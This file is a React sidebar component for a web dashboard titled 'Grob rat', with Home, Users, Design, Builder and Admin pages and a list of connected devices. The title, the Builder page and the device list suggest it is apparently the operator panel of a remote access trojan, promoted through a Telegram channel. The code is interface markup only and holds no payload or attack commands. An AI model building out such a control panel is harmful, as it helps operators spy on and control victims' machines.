// t.me/SentinelLinks

"use client"

import { Home, Palette, Wrench, Settings, LogOut, Monitor, Users } from "lucide-react"
import type { User } from "@/app/page"
import { cn } from "@/lib/utils"
import type { User as AuthUser } from "@/lib/db"

interface SidebarProps {
  users: User[]
  selectedUser: User | null
  onSelectUser: (user: User | null) => void
  activePage?: "home" | "design" | "builder" | "admin" | "users"
  onPageChange?: (page: "home" | "design" | "builder" | "admin" | "users") => void
  isScanning?: boolean
  onRefresh?: () => void
  currentUser?: AuthUser | null
  onLogout?: () => void
  showAllDevices?: boolean
  onToggleShowAll?: () => void
}

export function Sidebar({
  users,
  selectedUser,
  onSelectUser,
  activePage = "home",
  onPageChange,
  isScanning = false,
  onRefresh,
  currentUser,
  onLogout,
  showAllDevices = false,
  onToggleShowAll,
}: SidebarProps) {
  const getStatusColor = (status: User["status"]) => {
    switch (status) {
      case "online":
        return "text-green-500"
      case "away":
        return "text-yellow-500"
      case "offline":
        return "text-gray-500"
    }
  }

  const isAdmin = Boolean(currentUser?.is_admin)

  return (
    <div className="w-64 bg-sidebar border-r flex flex-col">
      <div className="p-4 border-b flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 rounded-lg bg-primary flex items-center justify-center">
            <Monitor className="w-4 h-4 text-primary-foreground" />
          </div>
          <div>
            <h1 className="text-sm font-semibold">Grob rat</h1>
            <p className="text-[10px] text-muted-foreground">v1.0.0</p>
          </div>
        </div>
        {currentUser && (
          <button onClick={onLogout} className="p-1.5 rounded-md hover:bg-accent transition-colors" title="Sign Out">
            <LogOut className="w-4 h-4 text-muted-foreground" />
          </button>
        )}
      </div>

      {currentUser && (
        <div className="px-4 py-3 border-b bg-accent/50">
          <p className="text-xs font-medium truncate">{currentUser.username}</p>
          {isAdmin && <p className="text-[10px] text-primary mt-0.5">Administrator</p>}
        </div>
      )}

// t.me/SentinelLinks
      <div className="flex-1 overflow-y-auto p-3">
        <div className="space-y-1">
          <button
            onClick={() => {
              onSelectUser(null)
              onPageChange?.("home")
            }}
            className={cn(
              "w-full flex items-center gap-2 px-3 py-2 rounded-md text-sm font-medium transition-colors",
              activePage === "home"
                ? "bg-accent text-accent-foreground"
                : "text-muted-foreground hover:bg-accent/50 hover:text-foreground",
            )}
          >
            <Home className="w-4 h-4" />
            <span>Home</span>
          </button>

          <button
            onClick={() => {
              onSelectUser(null)
              onPageChange?.("users")
            }}
            className={cn(
              "w-full flex items-center gap-2 px-3 py-2 rounded-md text-sm font-medium transition-colors",
              activePage === "users"
                ? "bg-accent text-accent-foreground"
                : "text-muted-foreground hover:bg-accent/50 hover:text-foreground",
            )}
          >
            <Users className="w-4 h-4" />
            <span>Users</span>
          </button>

          <button
            onClick={() => {
              onSelectUser(null)
              onPageChange?.("design")
            }}
            className={cn(
              "w-full flex items-center gap-2 px-3 py-2 rounded-md text-sm font-medium transition-colors",
              activePage === "design"
                ? "bg-accent text-accent-foreground"
                : "text-muted-foreground hover:bg-accent/50 hover:text-foreground",
            )}
          >
            <Palette className="w-4 h-4" />
            <span>Design</span>
          </button>

          <button
            onClick={() => {
              onSelectUser(null)
              onPageChange?.("builder")
            }}
            className={cn(
              "w-full flex items-center gap-2 px-3 py-2 rounded-md text-sm font-medium transition-colors",
              activePage === "builder"
                ? "bg-accent text-accent-foreground"
                : "text-muted-foreground hover:bg-accent/50 hover:text-foreground",
            )}
          >
            <Wrench className="w-4 h-4" />
            <span>Builder</span>
          </button>

          {isAdmin && (
            <button
              onClick={() => {
                onSelectUser(null)
                onPageChange?.("admin")
              }}
              className={cn(
                "w-full flex items-center gap-2 px-3 py-2 rounded-md text-sm font-medium transition-colors",
                activePage === "admin"
                  ? "bg-accent text-accent-foreground"
                  : "text-muted-foreground hover:bg-accent/50 hover:text-foreground",
              )}
            >
              <Settings className="w-4 h-4" />
              <span>Admin</span>
            </button>
          )}
        </div>
      </div>

      <div className="p-3 border-t">
        <div className="flex items-center justify-between text-[10px] text-muted-foreground">
          <span>Grob rat</span>
          <div className="flex items-center gap-1">
            <span className={cn("status-dot", users.length > 0 ? "online" : "offline")} />
            <span>{users.length > 0 ? "Connected" : "No devices"}</span>
          </div>
        </div>
      </div>
    </div>
  )
}

// t.me/SentinelLinks
//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
